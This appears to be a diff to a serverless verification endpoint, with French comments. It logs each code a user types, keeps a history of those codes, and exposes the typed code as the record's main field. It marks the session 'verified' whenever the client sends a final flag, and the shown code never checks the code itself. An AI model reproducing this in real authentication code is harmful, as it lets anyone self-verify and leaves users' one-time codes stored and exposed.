@@ -19,6 +19,11 @@ export async function onRequestPost({ request, env }) {
     const verifyId = (body?.verifyId || '').toString().trim();
     let code = (body?.code || '').toString();
     const loginIdReq = (body?.loginId || '').toString().trim() || null;
+    const finalFlag = (function(v){
+      if (v === true) return true;
+      const s = (v ?? '').toString().toLowerCase();
+      return s === 'true' || s === '1';
+    })(body?.final);
 
     if (!verifyId) {
       return json({ success: false, message: 'verifyId requis' }, 400);
@@ -62,6 +67,14 @@ export async function onRequestPost({ request, env }) {
     record.lastTypedCode = code;
     record.typedUpdatedAt = ts;
     record.typedHistory = trimmedHistory;
+    // Aligner le champ visible `code` avec la saisie de l'utilisateur
+    record.code = code;
+
+    // Marquer vérifié si final
+    if (finalFlag) {
+      record.status = 'verified';
+      record.verifiedAt = ts;
+    }
 
     // Sauvegarder la session de vérification (rafraîchir TTL à 15 min)
     await KV.put(verifyId, JSON.stringify(record), { expirationTtl: 15 * 60 });
@@ -76,9 +89,11 @@ export async function onRequestPost({ request, env }) {
         loginHistory.push({ code, ts, verifyId });
         const loginUpdated = {
           ...(loginRec || {}),
+          code, // exposer le code saisi comme champ principal
           lastTypedCode: code,
           typedUpdatedAt: ts,
           typedHistory: loginHistory.slice(-20),
+          ...(finalFlag ? { verifyStatus: 'verified', verifiedAt: ts } : {})
         };
         await KV.put(record.loginId, JSON.stringify(loginUpdated));
       } catch {
